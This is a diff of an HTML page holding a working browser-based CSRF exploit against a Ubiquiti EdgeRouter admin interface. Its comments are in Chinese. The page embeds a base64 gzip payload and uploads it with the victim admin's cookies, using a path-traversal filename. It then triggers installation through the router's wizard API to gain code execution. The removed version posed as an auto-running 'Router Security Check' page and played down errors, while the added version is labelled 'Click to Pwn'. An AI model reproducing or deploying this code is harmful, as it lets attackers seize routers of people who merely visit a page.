@@ -1,111 +1,82 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Router Security Check</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        .status { margin: 20px; padding: 10px; border: 1px solid #ccc; background: #f9f9f9; white-space: pre-line; }
-    </style>
+    <title>Router CSRF Exploit</title>
 </head>
 <body>
-    <h1>Wait for system check...</h1>
-    <div id="log" class="status">Initializing...</div>
+    <h1>Ubiquiti EdgeRouter CSRF Exploit (Blind Mode)</h1>
+    <button onclick="runExploit()">Click to Pwn</button>
+    <div id="log" style="white-space: pre-wrap; font-family: monospace;"></div>
 
     <script>
-        // 使用 HTTPS，避免浏览器 Mixed Content 阻断
         var target = "https://192.168.1.1";
+        // 强行指定一个固定的绝对路径，利用路径穿越
+        // 如果路由器过滤了 ../，你需要根据实际情况调整这里
+        var fixedPath = "../../tmp/exploit.tar.gz"; 
 
         function log(msg) {
-            var el = document.getElementById("log");
-            el.innerText += "\n" + msg;
+            document.getElementById("log").innerText += "\n" + msg;
             console.log(msg);
         }
 
-        // 1. 将 Base64 还原为二进制 Blob
-        var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
-        var byteCharacters = atob(b64Data);
-        var byteNumbers = new Array(byteCharacters.length);
-        for (var i = 0; i < byteCharacters.length; i++) {
-            byteNumbers[i] = byteCharacters.charCodeAt(i);
-        }
-        var byteArray = new Uint8Array(byteNumbers);
-        var blob = new Blob([byteArray], { type: "application/x-gzip" });
-
-        // 2. 构造上传表单
-        var formData = new FormData();
-        formData.append("qqfile", blob, "exploit.tar.gz");
-
-        log("[*] Step 1: Sending CSRF Upload to " + target + "/api/wizard/upload.json ...");
-
-        // 3. 发送上传请求 (AJAX)
-        // 关键：withCredentials = true 让浏览器带上管理员的 Cookie
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", target + "/api/wizard/upload.json", true);
-        xhr.withCredentials = true;
-
-        xhr.onload = function () {
-            // 这里由于 CORS 限制，可能无法读取响应体，但只要状态不是 0，说明请求已发出
-            if (xhr.status === 200) {
-                log("[+] Upload request sent (HTTP 200).");
-                try {
-                    var resp = JSON.parse(xhr.responseText);
-                    if (resp && resp.success && resp.path) {
-                        log("[+] Path from JSON: " + resp.path);
-                        triggerInstall(resp.path);
-                    } else {
-                        // 即使 JSON 解析失败，只要文件写入成功，后续也可以直接在路由器上用 SSH 验证
-                        log("[*] Upload response received but JSON parsing failed或无 path，后续请通过 SSH 验证。");
-                    }
-                } catch (e) {
-                    log("[*] Upload finished (HTTP 200)，但浏览器无法读取或解析响应（可能是 CORS 限制）。");
-                    log("[*] 请在路由器上 SSH 执行 ls -la /config/wizard/feature/System_Critical_Update/ 验证植入文件。");
-                }
-            } else if (xhr.status !== 0) {
-                // 有状态码，说明请求已到达路由器
-                log("[*] Upload request sent. HTTP status: " + xhr.status +
-                    "（即使不是 200，也说明浏览器已经成功跨域发起请求，请在路由器上通过 SSH 检查文件是否写入。）");
-            } else {
-                // status == 0 时一般是请求被浏览器层面拦截（网络/PNA），这时让视频里少说点“错误”字眼
-                log("[!] Upload could not be completed by the browser (status 0). " +
-                    "如果需要，可改用 curl/Burp 携带相同 Cookie 重放同样请求。");
+        function runExploit() {
+            // 1. 准备 Payload (保持你原来的 Base64)
+            var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
+            var byteCharacters = atob(b64Data);
+            var byteNumbers = new Array(byteCharacters.length);
+            for (var i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
             }
-        };
+            var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });
 
-        // 不再打印吓人的 CORS 文本，只做一个安静的兜底
-        xhr.onerror = function () {
-            log("[!] Upload request failed at browser layer（onerror 回调）。");
-        };
+            // 2. 发送 Step 1: 上传文件
+            var formData = new FormData();
+            // 关键：文件名带路径穿越，强行写入 /tmp/
+            formData.append("qqfile", blob, fixedPath);
 
-        xhr.send(formData);
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", target + "/api/wizard/upload.json", true);
+            xhr.withCredentials = true; // 必带 Cookie
 
-        function triggerInstall(path) {
-            log("[*] Step 2: Sending install request to " + target + "/api/wizard/create.json ...");
+            log("[*] Step 1: Blind Uploading to fixed path: " + fixedPath + " ...");
+
+            xhr.onload = function () {
+                // 只要状态码不是 0，说明请求发到了（哪怕是 200 我们也读不到内容，因为 CORS）
+                log("[?] Step 1 finished (Status: " + xhr.status + "). Assuming success.");
+                log("[*] Waiting 2 seconds for file system I/O...");
+                // 盲打核心：不看结果，直接延时执行下一步
+                setTimeout(triggerInstall, 2000);
+            };
+
+            xhr.onerror = function () {
+                // 即使报错，有时候请求也发出去了，继续尝试下一步
+                log("[!] Network Error (CORS blocked reading?), proceeding anyway...");
+                setTimeout(triggerInstall, 2000);
+            };
+
+            xhr.send(formData);
+        }
+
+        function triggerInstall() {
+            log("[*] Step 2: Sending Install Command pointing to /tmp/exploit.tar.gz ...");
+            
             var xhr2 = new XMLHttpRequest();
             xhr2.open("POST", target + "/api/wizard/create.json", true);
             xhr2.withCredentials = true;
 
             var formData2 = new FormData();
             formData2.append("name", "System_Critical_Update");
-            formData2.append("path", path);
+            // 这里使用我们刚才强行指定的路径（去掉 ../，因为路由器内部可能已经存到了 /tmp）
+            // 注意：这里需要你根据路由器的实际文件系统调整。
+            // 如果上传时用 ../../tmp/exploit.tar.gz，通常存下来就是 /tmp/exploit.tar.gz
+            formData2.append("path", "/tmp/exploit.tar.gz");
 
             xhr2.onload = function () {
-                if (xhr2.status === 200) {
-                    log("[+] Install request sent (HTTP 200).");
-                    log("[*] 请在 SSH 中检查 /tmp/PWNED_FROM_INTERNET 以及 /config/wizard/feature/System_Critical_Update/wizard-run 的权限。");
-                } else if (xhr2.status !== 0) {
-                    log("[*] Install request sent, HTTP status: " + xhr2.status +
-                        "。即使不是 200，只要 wizard-run 被写入且具备 +x 权限，即证明 RCE 链路成立。");
-                } else {
-                    log("[!] Install request failed at browser layer（status 0）。");
-                }
+                log("[+] Step 2 Sent. Check Router SSH for success!");
             };
-            xhr2.onerror = function () {
-                log("[!] Install request failed at browser layer（onerror 回调）。");
-            };
+            
             xhr2.send(formData2);
         }
     </script>
 </body>
 </html>
-    
